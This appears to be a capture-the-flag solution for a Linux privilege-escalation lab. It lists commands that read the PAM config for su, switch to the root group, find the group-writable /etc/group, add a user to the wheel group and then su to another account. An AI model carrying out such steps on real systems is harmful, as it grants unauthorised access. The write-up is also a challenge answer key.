# solution
- `cat /etc/pam.d/su` shows that the `wheel` group is required to use `su`:   
```
# Uncomment the following line to require a user to be in the "wheel" group.
auth          required        pam_wheel.so use_uid
```
- find that the user also belongs to the group `root`
- `newgrp root` to change the group to `root`
- `find / -type f -perm /g=w | grep -v /proc` to find files that group-writable, for group `root``
- The output shows `/etc/group` which is interesting.
- `vi /etc/group` to add `minion` to the `wheel` group.
- `su - boss` to become the user `boss`
- run the script: `. /home/boss/lockdown.sh`